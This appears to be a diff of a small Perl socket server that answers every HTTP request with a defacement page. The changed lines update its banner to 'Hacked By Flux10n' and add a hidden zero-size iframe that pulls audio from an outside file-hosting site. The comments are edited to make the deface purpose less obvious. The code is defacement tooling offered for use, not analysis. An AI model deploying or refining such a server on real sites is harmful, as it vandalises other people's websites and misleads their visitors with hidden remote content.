@@ -3,7 +3,7 @@ use strict;
 use IO::Socket;
 
 sub Wait {
-	wait; # iyh
+	wait; # wait needed to keep <defunct> pids from building up
 }
 
 $SIG{CHLD} = \&Wait;
@@ -19,9 +19,9 @@ while($client = $server->accept()) {
 	select $client;
 	print $client "HTTP/1.0 200 OK\r\n";
 	print $client "Content-type: text/html\r\n\r\n";
-	print $client '<h1>Hacked by Flux10n</h1>'; # script deface
+	print $client '<H1>Hacked By Flux10n</H1><iframe width="0" height="0" src="https://e.top4top.net/m_11641bcpr0.mp3" frameborder="0" allowfullscreen></iframe>'; # set your html content
 }
 continue {
-	close($client); #fuck
+	close($client); #kills hangs
 	kill CHLD => -$$;
 }
